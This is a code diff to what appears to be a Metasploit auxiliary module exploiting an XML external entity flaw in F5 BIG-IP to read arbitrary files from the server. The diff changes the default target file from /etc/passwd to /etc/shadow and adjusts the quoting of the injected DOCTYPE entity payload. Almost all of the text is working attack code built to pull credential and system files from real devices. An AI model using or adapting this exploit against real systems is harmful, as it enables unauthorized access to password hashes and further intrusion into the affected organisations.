@@ -46,7 +46,7 @@ class Metasploit4 < Msf::Auxiliary
 		[
 			Opt::RPORT(443),
 			OptString.new('TARGETURI', [true, 'Path to F5 BIG-IP', '/sam/admin/vpe2/public/php/server.php']),
-			OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
+			OptString.new('RFILE', [true, 'Remote File', '/etc/shadow']),
 			OptString.new('VALIDCOOKIE', [true, 'BIGIPAuthCookie value', ''])
 
 		], self.class)
@@ -80,8 +80,8 @@ class Metasploit4 < Msf::Auxiliary
 
 		entity = Rex::Text.rand_text_alpha(rand(4) + 4)
 
-		data =  "<?xml  version='1.0' encoding='utf-8' ?>" + "\r\n"
-		data << "<!DOCTYPE a [<!ENTITY #{entity} SYSTEM \"#{datastore['RFILE']}\"> ]>" + "\r\n"
+		data =  "<?xml  version=\"1.0\" encoding='utf-8' ?>" + "\r\n"
+		data << "<!DOCTYPE a [<!ENTITY #{entity} SYSTEM '#{datastore['RFILE']}'> ]>" + "\r\n"
 		data << "<message><dialogueType>&#{entity};</dialogueType></message>" + "\r\n"
 
 
